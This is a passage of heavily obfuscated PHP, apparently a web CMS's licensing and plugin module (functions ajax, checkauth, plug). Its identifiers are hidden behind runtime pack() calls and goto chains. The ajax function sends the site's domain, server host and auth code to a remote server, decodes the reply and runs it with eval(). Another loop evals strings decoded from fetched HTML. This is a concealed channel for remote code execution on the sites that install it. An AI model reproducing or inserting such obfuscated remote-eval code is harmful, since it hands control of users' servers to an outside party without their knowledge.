$Q24F8;$Q24P5=$Q24P4 . $t;$Q24F10=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x32}));$Q24P6=$Q24P5 . $Q24F10;$Q24P7=$Q24P6 . $type;$Q24F11=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{063}));$Q24P8=$Q24P7 . $Q24F11;$Q24P9=0-304;$Q24P10=21*E_CORE_ERROR;$Q24P11=$Q24P9+$Q24P10;unset($Q24tI12);$Q24tI12=$GLOBALS[$Q24F0]($GLOBALS[$Q24F1]($GLOBALS[$Q24F2]($Q24P8),$Q24P11));$html=$Q24tI12;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x11}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{065}));$GLOBALS[$Q24F0]($Q24F1,$html,$arr);foreach($arr[(22*E_CORE_ERROR-352)]as $value){$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{023}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2s;goto Q24ldMhx2s;Q24eWjgx2s:$Q24ACV2=&$GLOBALS[E5PR5S4Q][54];goto Q24x2r;Q24ldMhx2s:$Q24ACV2=$GLOBALS[E5PR5S4Q][54];Q24x2r:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));unset($Q24ACV5);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2u;goto Q24ldMhx2u;Q24eWjgx2u:$Q24ACV5=&$GLOBALS[E5PR5S4Q][067];goto Q24x2t;Q24ldMhx2u:$Q24ACV5=$GLOBALS[E5PR5S4Q][067];Q24x2t:$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV5));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($Q24F1,$Q24F4,$value);$v=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{023}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{56}));unset($Q24ACV3);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2w;goto Q24ldMhx2w;Q24eWjgx2w:$Q24ACV3=&$GLOBALS[E5PR5S4Q][067];goto Q24x2v;Q24ldMhx2w:$Q24ACV3=$GLOBALS[E5PR5S4Q][067];Q24x2v:$Q24F2=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV3));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($Q24F1,$Q24F2,$v);$v=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{023}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x39}));$Q24F2=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{58}));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($Q24F1,$Q24F2,$v);$v=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{023}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2y;goto Q24ldMhx2y;Q24eWjgx2y:$Q24ACV2=&$GLOBALS[E5PR5S4Q][0x3B];goto Q24x2x;Q24ldMhx2y:$Q24ACV2=$GLOBALS[E5PR5S4Q][0x3B];Q24x2x:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));unset($Q24ACV5);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx31;goto Q24ldMhx31;Q24eWjgx31:$Q24ACV5=&$GLOBALS[E5PR5S4Q][60];goto Q24x3z;Q24ldMhx31:$Q24ACV5=$GLOBALS[E5PR5S4Q][60];Q24x3z:$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV5));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($Q24F1,$Q24F4,$v);$v=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{023}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx33;goto Q24ldMhx33;Q24eWjgx33:$Q24ACV2=&$GLOBALS[E5PR5S4Q][0x3D];goto Q24x32;Q24ldMhx33:$Q24ACV2=$GLOBALS[E5PR5S4Q][0x3D];Q24x32:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));unset($Q24ACV5);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx35;goto Q24ldMhx35;Q24eWjgx35:$Q24ACV5=&$GLOBALS[E5PR5S4Q][0x3E];goto Q24x34;Q24ldMhx35:$Q24ACV5=$GLOBALS[E5PR5S4Q][0x3E];Q24x34:$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV5));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($Q24F1,$Q24F4,$v);$v=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{023}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx37;goto Q24ldMhx37;Q24eWjgx37:$Q24ACV2=&$GLOBALS[E5PR5S4Q][0x3F];goto Q24x36;Q24ldMhx37:$Q24ACV2=$GLOBALS[E5PR5S4Q][0x3F];Q24x36:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{64}));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($Q24F1,$Q24F4,$v);$v=$Q24tI0;eval($v);$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{023}));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($value,$api,$html);$html=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx39;goto Q24ldMhx39;Q24eWjgx39:$Q24ACV1=&$GLOBALS[E5PR5S4Q][067];goto Q24x38;Q24ldMhx39:$Q24ACV1=$GLOBALS[E5PR5S4Q][067];Q24x38:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));unset($Q24tI0);$Q24tI0=$Q24F0;$api=$Q24tI0;}unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx3l;goto Q24ldMhx3l;Q24eWjgx3l:$Q24ACV1=&$GLOBALS[E5PR5S4Q][0x41];goto Q24x3k;Q24ldMhx3l:$Q24ACV1=$GLOBALS[E5PR5S4Q][0x41];Q24x3k:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q240=$html . $Q24F0;$Q24P1=0-1007;$Q24P2=E_CORE_ERROR*63;$Q24P3=$Q24P1+$Q24P2;$Q24F2=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{45}));unset($Q24ACV4);if(is_array($GLOBALS[AR2Q674J][$Q24P3]))goto Q24eWjgx3j;goto Q24ldMhx3j;Q24eWjgx3j:$Q24ACV4=&$GLOBALS[AR2Q674J][$Q24P3][$Q24F2];goto Q24x3i;Q24ldMhx3j:$Q24ACV4=$GLOBALS[AR2Q674J][$Q24P3][$Q24F2];Q24x3i:$Q24F3=call_user_func_array("t",array(&$Q24ACV4));$Q244=$Q240 . $Q24F3;unset($Q24ACV6);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx3h;goto Q24ldMhx3h;Q24eWjgx3h:$Q24ACV6=&$GLOBALS[E5PR5S4Q][0102];goto Q24x3g;Q24ldMhx3h:$Q24ACV6=$GLOBALS[E5PR5S4Q][0102];Q24x3g:$Q24F5=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV6));$Q245=$Q244 . $Q24F5;$Q24P6=0-1007;$Q24P7=E_CORE_ERROR*63;$Q24P8=$Q24P6+$Q24P7;unset($Q24ACV8);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx3b;goto Q24ldMhx3b;Q24eWjgx3b:$Q24ACV8=&$GLOBALS[E5PR5S4Q][0103];goto Q24x3a;Q24ldMhx3b:$Q24ACV8=$GLOBALS[E5PR5S4Q][0103];Q24x3a:$Q24F7=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV8));unset($Q24ACV11);if(is_array($GLOBALS[AR2Q674J][$Q24P8]))goto Q24eWjgx3f;goto Q24ldMhx3f;Q24eWjgx3f:$Q24ACV11=&$GLOBALS[AR2Q674J][$Q24P8][$Q24F7];goto Q24x3e;Q24ldMhx3f:$Q24ACV11=$GLOBALS[AR2Q674J][$Q24P8][$Q24F7];Q24x3e:$Q24F10=call_user_func_array("intval",array(&$Q24ACV11));$Q249=$Q245 . $Q24F10;unset($Q24ACV13);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx3d;goto Q24ldMhx3d;Q24eWjgx3d:$Q24ACV13=&$GLOBALS[E5PR5S4Q][0104];goto Q24x3c;Q24ldMhx3d:$Q24ACV13=$GLOBALS[E5PR5S4Q][0104];Q24x3c:$Q24F12=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV13));$Q2410=$Q249 . $Q24F12;unset($Q24tI11);$Q24tI11=$Q2410;$html=$Q24tI11;return $html;}function ajax($action,$data=""){$Q24F0=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{1}));unset($Q24ACV2);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx3n;goto Q24ldMhx3n;Q24eWjgx3n:$Q24ACV2=&$GLOBALS[L33N91HQ][2];goto Q24x3m;Q24ldMhx3n:$Q24ACV2=$GLOBALS[L33N91HQ][2];Q24x3m:$Q24F1=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV2));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{3}));$Q240=!defined($Q24F0);if($Q240)goto Q24eWjgx3p;goto Q24ldMhx3p;Q24eWjgx3p:unset($Q24ACV1);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx3r;goto Q24ldMhx3r;Q24eWjgx3r:$Q24ACV1=&$GLOBALS[L33N91HQ][0x4];goto Q24x3q;Q24ldMhx3r:$Q24ACV1=$GLOBALS[L33N91HQ][0x4];Q24x3q:$Q24F0=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{3}));unset($Q24ACV5);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx3t;goto Q24ldMhx3t;Q24eWjgx3t:$Q24ACV5=&$GLOBALS[L33N91HQ][05];goto Q24x3s;Q24ldMhx3t:$Q24ACV5=$GLOBALS[L33N91HQ][05];Q24x3s:$Q24F4=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV5));call_user_func($Q24F0,$Q24F3,$Q24F4);goto Q24x3o;Q24ldMhx3p:Q24x3o:$Q24A0=array();$Q24A0[]=$_SERVER;unset($Q24tI0);$Q24tI0=$Q24A0;$GLOBALS[UC126C4v]=$Q24tI0;global $conn,$C_authcode,$C_fdomain,$C_fzon;$Q24F0=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{06}));$Q240=$C_fdomain!=$Q24F0;$Q244=(bool)$Q240;if($Q244)goto Q24eWjgx43;goto Q24ldMhx43;Q24eWjgx43:$Q241=E_CORE_ERROR*36;$Q242=$Q241-575;$Q243=$C_fzon==$Q242;$Q244=(bool)$Q243;goto Q24x42;Q24ldMhx43:Q24x42:$Q249=(bool)$Q244;if($Q249)goto Q24eWjgx41;goto Q24ldMhx41;Q24eWjgx41:$Q24F1=call_user_func_array("www",array(&$C_fdomain));$Q24P5=0-880;$Q24P6=55*E_CORE_ERROR;$Q24P7=$Q24P5+$Q24P6;unset($Q24ACV3);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx3w;goto Q24ldMhx3w;Q24eWjgx3w:$Q24ACV3=&$GLOBALS[L33N91HQ][0x7];goto Q24x3v;Q24ldMhx3w:$Q24ACV3=$GLOBALS[L33N91HQ][0x7];Q24x3v:$Q24F2=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV3));unset($Q24ACV6);if(is_array($GLOBALS[UC126C4v][$Q24P7]))goto Q24eWjgx3y;goto Q24ldMhx3y;Q24eWjgx3y:$Q24ACV6=&$GLOBALS[UC126C4v][$Q24P7][$Q24F2];goto Q24x3x;Q24ldMhx3y:$Q24ACV6=$GLOBALS[UC126C4v][$Q24P7][$Q24F2];Q24x3x:$Q24F5=call_user_func_array("www",array(&$Q24ACV6));$Q248=$Q24F1!=$Q24F5;$Q249=(bool)$Q248;goto Q24x4z;Q24ldMhx41:Q24x4z:if($Q249)goto Q24eWjgx44;goto Q24ldMhx44;Q24eWjgx44:unset($Q24ACV1);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx46;goto Q24ldMhx46;Q24eWjgx46:$Q24ACV1=&$GLOBALS[L33N91HQ][010];goto Q24x45;Q24ldMhx46:$Q24ACV1=$GLOBALS[L33N91HQ][010];Q24x45:$Q24F0=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV1));$Q24P0=$Q24F0 . $action;$Q24F3=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{9}));$Q24P1=$Q24F3 . $C_fdomain;$Q24F4=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{10}));$Q24P2=$Q24P1 . $Q24F4;$Q24P3=0-880;$Q24P4=55*E_CORE_ERROR;$Q24P5=$Q24P3+$Q24P4;$Q24F5=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{013}));$Q24P6=$Q24P2 . $GLOBALS[UC126C4v][$Q24P5][$Q24F5];$Q24F6=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{0xC}));$Q24P7=$Q24P6 . $Q24F6;$Q24P8=$Q24P7 . $C_authcode;unset($Q24ACV8);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx48;goto Q24ldMhx48;Q24eWjgx48:$Q24ACV8=&$GLOBALS[L33N91HQ][0xD];goto Q24x47;Q24ldMhx48:$Q24ACV8=$GLOBALS[L33N91HQ][0xD];Q24x47:$Q24F7=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV8));$Q24P9=$Q24P8 . $Q24F7;$Q24F9=call_user_func_array("urlencode",array(&$data));$Q24P10=$Q24P9 . $Q24F9;$Q24F11=call_user_func_array("getbody",array(&$Q24P0,&$Q24P10));unset($Q24tI11);$Q24tI11=$Q24F11;$info=$Q24tI11;goto Q24x3u;Q24ldMhx44:unset($Q24ACV1);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx4a;goto Q24ldMhx4a;Q24eWjgx4a:$Q24ACV1=&$GLOBALS[L33N91HQ][010];goto Q24x49;Q24ldMhx4a:$Q24ACV1=$GLOBALS[L33N91HQ][010];Q24x49:$Q24F0=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV1));$Q24P0=$Q24F0 . $action;$Q24F3=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{9}));$Q24P1=0-880;$Q24P2=55*E_CORE_ERROR;$Q24P3=$Q24P1+$Q24P2;unset($Q24ACV5);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx4c;goto Q24ldMhx4c;Q24eWjgx4c:$Q24ACV5=&$GLOBALS[L33N91HQ][0x7];goto Q24x4b;Q24ldMhx4c:$Q24ACV5=$GLOBALS[L33N91HQ][0x7];Q24x4b:$Q24F4=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV5));$Q24P4=$Q24F3 . $GLOBALS[UC126C4v][$Q24P3][$Q24F4];$Q24F7=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{0xC}));$Q24P5=$Q24P4 . $Q24F7;$Q24P6=$Q24P5 . $C_authcode;unset($Q24ACV9);if(is_array($GLOBALS[L33N91HQ]))goto Q24eWjgx4e;goto Q24ldMhx4e;Q24eWjgx4e:$Q24ACV9=&$GLOBALS[L33N91HQ][0xD];goto Q24x4d;Q24ldMhx4e:$Q24ACV9=$GLOBALS[L33N91HQ][0xD];Q24x4d:$Q24F8=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},&$Q24ACV9));$Q24P7=$Q24P6 . $Q24F8;$Q24F10=call_user_func_array("urlencode",array(&$data));$Q24P8=$Q24P7 . $Q24F10;$Q24F12=call_user_func_array("getbody",array(&$Q24P0,&$Q24P8));unset($Q24tI9);$Q24tI9=$Q24F12;$info=$Q24tI9;Q24x3u:$Q24F0=call_user_func_array("pack",array($GLOBALS[L33N91HQ]{0},$GLOBALS[L33N91HQ]{1}));eval($GLOBALS[$Q24F0]($info));}function checkauth(){$Q24F0=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{1}));$Q240=!defined($Q24F0);if($Q240)goto Q24eWjgx4g;goto Q24ldMhx4g;Q24eWjgx4g:$Q24F0=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{0x2}));$Q24F1=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{1}));unset($Q24ACV3);if(is_array($GLOBALS[J24Y3E3Q]))goto Q24eWjgx4i;goto Q24ldMhx4i;Q24eWjgx4i:$Q24ACV3=&$GLOBALS[J24Y3E3Q][0x3];goto Q24x4h;Q24ldMhx4i:$Q24ACV3=$GLOBALS[J24Y3E3Q][0x3];Q24x4h:$Q24F2=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},&$Q24ACV3));call_user_func($Q24F0,$Q24F1,$Q24F2);goto Q24x4f;Q24ldMhx4g:Q24x4f:$Q24A0=array();$Q24A0[]=$_SERVER;unset($Q24tI0);$Q24tI0=$Q24A0;$GLOBALS[OPORL0Uv]=$Q24tI0;global $conn,$C_authcode,$C_fdomain,$C_fzon;$Q24F0=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{04}));$Q24F1=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{04}));$Q240=$_SESSION[$Q24F0]==$Q24F1;if($Q240)goto Q24eWjgx4k;goto Q24ldMhx4k;Q24eWjgx4k:return true;goto Q24x4j;Q24ldMhx4k:$Q24F0=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{05}));$Q240=$C_fdomain!=$Q24F0;$Q248=(bool)$Q240;if($Q248)goto Q24eWjgx4t;goto Q24ldMhx4t;Q24eWjgx4t:$Q241=0-112;$Q242=E_CORE_ERROR*7;$Q243=$Q241+$Q242;$Q244=$Q243-351;$Q245=22*E_CORE_ERROR;$Q246=$Q244+$Q245;$Q247=$C_fzon==$Q246;$Q248=(bool)$Q247;goto Q24x4s;Q24ldMhx4t:Q24x4s:$Q2413=(bool)$Q248;if($Q2413)goto Q24eWjgx4r;goto Q24ldMhx4r;Q24eWjgx4r:$Q24F1=call_user_func_array("www",array(&$C_fdomain));$Q24P9=0-112;$Q24P10=E_CORE_ERROR*7;$Q24P11=$Q24P9+$Q24P10;unset($Q24ACV3);if(is_array($GLOBALS[J24Y3E3Q]))goto Q24eWjgx4n;goto Q24ldMhx4n;Q24eWjgx4n:$Q24ACV3=&$GLOBALS[J24Y3E3Q][06];goto Q24x4m;Q24ldMhx4n:$Q24ACV3=$GLOBALS[J24Y3E3Q][06];Q24x4m:$Q24F2=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},&$Q24ACV3));unset($Q24ACV6);if(is_array($GLOBALS[OPORL0Uv][$Q24P11]))goto Q24eWjgx4p;goto Q24ldMhx4p;Q24eWjgx4p:$Q24ACV6=&$GLOBALS[OPORL0Uv][$Q24P11][$Q24F2];goto Q24x4o;Q24ldMhx4p:$Q24ACV6=$GLOBALS[OPORL0Uv][$Q24P11][$Q24F2];Q24x4o:$Q24F5=call_user_func_array("www",array(&$Q24ACV6));$Q2412=$Q24F1!=$Q24F5;$Q2413=(bool)$Q2412;goto Q24x4q;Q24ldMhx4r:Q24x4q:if($Q2413)goto Q24eWjgx4u;goto Q24ldMhx4u;Q24eWjgx4u:$Q24F0=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{07}));$Q24P0=$Q24F0 . $C_fdomain;unset($Q24ACV2);if(is_array($GLOBALS[J24Y3E3Q]))goto Q24eWjgx4w;goto Q24ldMhx4w;Q24eWjgx4w:$Q24ACV2=&$GLOBALS[J24Y3E3Q][010];goto Q24x4v;Q24ldMhx4w:$Q24ACV2=$GLOBALS[J24Y3E3Q][010];Q24x4v:$Q24F1=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},&$Q24ACV2));$Q24P1=$Q24F1 . $C_authcode;$Q24F4=call_user_func_array("getbody",array(&$Q24P0,&$Q24P1));unset($Q24tI2);$Q24tI2=$Q24F4;$NL5KPODv=$Q24tI2;goto Q24x4l;Q24ldMhx4u:$Q24F0=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{07}));$Q24P0=0-112;$Q24P1=E_CORE_ERROR*7;$Q24P2=$Q24P0+$Q24P1;unset($Q24ACV2);if(is_array($GLOBALS[J24Y3E3Q]))goto Q24eWjgx4y;goto Q24ldMhx4y;Q24eWjgx4y:$Q24ACV2=&$GLOBALS[J24Y3E3Q][06];goto Q24x4x;Q24ldMhx4y:$Q24ACV2=$GLOBALS[J24Y3E3Q][06];Q24x4x:$Q24F1=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},&$Q24ACV2));$Q24P3=$Q24F0 . $GLOBALS[OPORL0Uv][$Q24P2][$Q24F1];unset($Q24ACV5);if(is_array($GLOBALS[J24Y3E3Q]))goto Q24eWjgx51;goto Q24ldMhx51;Q24eWjgx51:$Q24ACV5=&$GLOBALS[J24Y3E3Q][010];goto Q24x5z;Q24ldMhx51:$Q24ACV5=$GLOBALS[J24Y3E3Q][010];Q24x5z:$Q24F4=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},&$Q24ACV5));$Q24P4=$Q24F4 . $C_authcode;$Q24F7=call_user_func_array("getbody",array(&$Q24P3,&$Q24P4));unset($Q24tI5);$Q24tI5=$Q24F7;$NL5KPODv=$Q24tI5;Q24x4l:unset($Q24ACV1);if(is_array($GLOBALS[J24Y3E3Q]))goto Q24eWjgx54;goto Q24ldMhx54;Q24eWjgx54:$Q24ACV1=&$GLOBALS[J24Y3E3Q][0x9];goto Q24x53;Q24ldMhx54:$Q24ACV1=$GLOBALS[J24Y3E3Q][0x9];Q24x53:$Q24F0=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},&$Q24ACV1));$Q240=$NL5KPODv==$Q24F0;if($Q240)goto Q24eWjgx55;goto Q24ldMhx55;Q24eWjgx55:$Q24F0=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{04}));$Q24F1=call_user_func_array("pack",array($GLOBALS[J24Y3E3Q]{0},$GLOBALS[J24Y3E3Q]{04}));unset($Q24tI0);$Q24tI0=$Q24F1;$_SESSION[$Q24F0]=$Q24tI0;return true;goto Q24x52;Q24ldMhx55:return false;Q24x52:Q24x4j:}function plug($NB7C52Jv,$ZG4D2S1v){unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx59;goto Q24ldMhx59;Q24eWjgx59:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x58;Q24ldMhx59:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x58:unset($Q24ACV2);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx57;goto Q24ldMhx57;Q24eWjgx57:$Q24ACV2=&$GLOBALS[PJZU4IIQ][0x1];goto Q24x56;Q24ldMhx57:$Q24ACV2=$GLOBALS[PJZU4IIQ][0x1];Q24x56:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,&$Q24ACV2));unset($Q24ACV6);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5b;goto Q24ldMhx5b;Q24eWjgx5b:$Q24ACV6=&$GLOBALS[PJZU4IIQ][0];goto Q24x5a;Q24ldMhx5b:$Q24ACV6=$GLOBALS[PJZU4IIQ][0];Q24x5a:$Q24F5=call_user_func_array("pack",array(&$Q24ACV6,$GLOBALS[PJZU4IIQ]{0x2}));unset($Q24tI0);$Q24tI0=$Q24F5;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5f;goto Q24ldMhx5f;Q24eWjgx5f:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x5e;Q24ldMhx5f:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x5e:unset($Q24ACV2);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5d;goto Q24ldMhx5d;Q24eWjgx5d:$Q24ACV2=&$GLOBALS[PJZU4IIQ][3];goto Q24x5c;Q24ldMhx5d:$Q24ACV2=$GLOBALS[PJZU4IIQ][3];Q24x5c:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,&$Q24ACV2));unset($Q24ACV6);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5j;goto Q24ldMhx5j;Q24eWjgx5j:$Q24ACV6=&$GLOBALS[PJZU4IIQ][0];goto Q24x5i;Q24ldMhx5j:$Q24ACV6=$GLOBALS[PJZU4IIQ][0];Q24x5i:unset($Q24ACV7);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5h;goto Q24ldMhx5h;Q24eWjgx5h:$Q24ACV7=&$GLOBALS[PJZU4IIQ][0x4];goto Q24x5g;Q24ldMhx5h:$Q24ACV7=$GLOBALS[PJZU4IIQ][0x4];Q24x5g:$Q24F5=call_user_func_array("pack",array(&$Q24ACV6,&$Q24ACV7));unset($Q24tI0);$Q24tI0=$Q24F5;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5l;goto Q24ldMhx5l;Q24eWjgx5l:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x5k;Q24ldMhx5l:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x5k:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[PJZU4IIQ]{05}));unset($Q24ACV4);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5p;goto Q24ldMhx5p;Q24eWjgx5p:$Q24ACV4=&$GLOBALS[PJZU4IIQ][0];goto Q24x5o;Q24ldMhx5p:$Q24ACV4=$GLOBALS[PJZU4IIQ][0];Q24x5o:unset($Q24ACV5);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5n;goto Q24ldMhx5n;Q24eWjgx5n:$Q24ACV5=&$GLOBALS[PJZU4IIQ][0x6];goto Q24x5m;Q24ldMhx5n:$Q24ACV5=$GLOBALS[PJZU4IIQ][0x6];Q24x5m:$Q24F3=call_user_func_array("pack",array(&$Q24ACV4,&$Q24ACV5));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5r;goto Q24ldMhx5r;Q24eWjgx5r:$Q24ACV1=&$GLOBALS[PJZU4IIQ][0];goto Q24x5q;Q24ldMhx5r:$Q24ACV1=$GLOBALS[PJZU4IIQ][0];Q24x5q:$Q24F0=call_user_func_array("pack",array(&$Q24ACV1,$GLOBALS[PJZU4IIQ]{7}));unset($Q24ACV4);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5v;goto Q24ldMhx5v;Q24eWjgx5v:$Q24ACV4=&$GLOBALS[PJZU4IIQ][0];goto Q24x5u;Q24ldMhx5v:$Q24ACV4=$GLOBALS[PJZU4IIQ][0];Q24x5u:unset($Q24ACV5);if(is_array($GLOBALS[PJZU4IIQ]))goto Q24eWjgx5t;goto Q24ldMhx5t;Q24eWjgx5t:$Q24ACV5=&$GLOBALS[PJZU4IIQ][0x8];goto 